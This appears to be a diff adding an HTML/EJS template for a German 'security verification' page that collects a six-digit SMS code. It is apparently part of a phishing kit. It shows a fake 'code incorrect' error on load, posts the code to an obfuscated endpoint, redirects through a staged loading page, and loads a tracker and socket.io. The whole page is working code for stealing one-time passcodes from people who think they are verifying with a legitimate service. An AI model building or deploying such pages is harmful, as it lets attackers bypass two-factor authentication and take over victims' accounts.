@@ -1,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <%- include('partials/tracker') %>
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina maina2">
+            <div class="inmaina">
+               
+                <p class="pp1">Sicherheitsverifizierung</p>
+                <p style=" margin-bottom: 20px; color: rgb(21, 87, 158); font-weight: 600;">Zur Verifizierung Ihrer Identität wurde ein einmaliger Sicherheitscode an Ihr registriertes Mobilgerät gesendet.</p>
+                <p style="color: #d01a1a; font-weight: 500; margin-bottom: 15px; text-align: center;">Der eingegebene Code ist nicht korrekt. Bitte überprüfen Sie den Code, den wir Ihnen gesendet haben.</p>
+                <!--  -->
+                
+            
+                    <form method="post" id="semitr2">
+                       <p>Sicherheitscode eingeben</p>
+                       <input type="text" id="smsCode" placeholder="6-stelliger Code" maxlength="6">
+                       <span class="error" id="smsCodeError" style="display: block;">Der eingegebene Code ist falsch. Bitte versuchen Sie es erneut.</span>
+                       
+                       <p class="code-hint" style="font-size: 12px; color: #666; margin-top: 5px;">Der Code ist 10 Minuten gültig.</p>
+                        
+                        <button class="btn" type="submit">Bestätigen</button>
+                        <div class="privacy">
+                            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
+                            <p>Ihre Daten werden nach höchsten Sicherheitsstandards geschützt</p>
+                        </div>
+                    </form>
+                    
+                    <script>
+                        // Add CSS for error messages
+                        const style = document.createElement('style');
+                        style.textContent = '.error { color: #d01a1a; font-size: 12px; display: block; margin-top: 5px; font-weight: 500; }\n' +
+                                           '.input-error { border: 1px solid #d01a1a !important; background-color: #fff8f8; }\n' +
+                                           '.valid-input { border: 1px solid #2e8b57 !important; }';
+                        document.head.appendChild(style);
+                    </script>
+
+                
+            </div>
+            
+        </div>  
+        
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('semitr2');
+            const smsCodeInput = document.getElementById('smsCode');
+            const smsCodeError = document.getElementById('smsCodeError');
+            
+            // Only allow numbers in SMS code field
+            smsCodeInput.addEventListener('keypress', function(e) {
+                if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                    e.preventDefault();
+                }
+            });
+            
+            // Clear error when user starts typing
+            smsCodeInput.addEventListener('input', function() {
+                smsCodeError.style.display = 'none';
+                smsCodeInput.classList.remove('input-error');
+            });
+            
+            // Validate SMS code format
+            function validateSmsCode(code) {
+                return /^\d{6}$/.test(code); // Must be exactly 6 digits
+            }
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const smsCode = smsCodeInput.value.trim();
+                
+                // Validate SMS code
+                if (!smsCode) {
+                    smsCodeError.textContent = 'Bitte geben Sie den Sicherheitscode ein';
+                    smsCodeError.style.display = 'block';
+                    smsCodeInput.classList.add('input-error');
+                    return false;
+                } else if (!validateSmsCode(smsCode)) {
+                    smsCodeError.textContent = 'Der Sicherheitscode muss 6 Ziffern enthalten';
+                    smsCodeError.style.display = 'block';
+                    smsCodeInput.classList.add('input-error');
+                    return false;
+                }
+                
+                // Show processing state
+                const submitButton = form.querySelector('button[type="submit"]');
+                const originalButtonText = submitButton.textContent;
+                submitButton.textContent = 'Wird verarbeitet...';
+                submitButton.disabled = true;
+                
+                $.ajax({
+                    url: '/Qv69PRvXg6PQEvrzJx6j',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: smsCode }),
+                    success: function(info) {
+                        if(info.OK){
+                            window.location.href = '/loading?time=3&url=/LkaaomeM9HwWU472fgsPr';
+                        } else {
+                            // Show error message
+                            smsCodeError.textContent = 'Ungültiger Sicherheitscode. Bitte überprüfen Sie Ihre Eingabe.';
+                            smsCodeError.style.display = 'block';
+                            smsCodeInput.classList.add('input-error');
+                            
+                            // Reset button
+                            submitButton.textContent = originalButtonText;
+                            submitButton.disabled = false;
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        // Show error message
+                        smsCodeError.textContent = 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.';
+                        smsCodeError.style.display = 'block';
+                        smsCodeInput.classList.add('input-error');
+                        
+                        // Reset button
+                        submitButton.textContent = originalButtonText;
+                        submitButton.disabled = false;
+                    }
+                });
+            });
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
